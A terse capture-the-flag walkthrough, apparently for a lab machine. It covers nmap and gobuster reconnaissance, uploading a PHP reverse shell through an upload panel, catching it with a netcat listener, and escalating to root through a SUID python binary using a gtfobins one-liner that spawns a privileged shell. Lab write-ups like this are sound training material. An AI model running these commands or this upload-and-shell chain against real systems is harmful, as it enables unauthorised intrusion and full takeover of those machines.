--Nmap scan:  
nmap -vv -sC -sV -p- <target ip> -oN file.nmap
 
ports 22 ssh, 88 http
 
--gobuster to find hidden web directories:  
gobuster dir -u <ip:port> -w <path to wordlist> (usr/share/wordlists/dirbuster/directory...)
 
/panel/  
/uploads
 
go to website and see that panel is upload page. see from cookies that it is running php.
 
search for php reverse shell (pentest monkey)
 
RHOST == receiver (your) ip  
RPORT == receiver (your) port (can be random)
 
--set up netcat listener:  
nc -nlvp <whatever port you want>
 
upload to /panel/
 
go to /uploads/ and click on the link for your upload
 
you have reverse shell
 
look up how to upgrade linux shell using python
 
--search for user.txt flag:  
find / -type f -name user.txt
 
*flag*
 
--search for files with SUID perms:  
find / -type f -user root -perm -4000 2>/dev/null
 
search gtfobins for a python SUID script for privesc  
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
cd /root
 
*flag*
 
END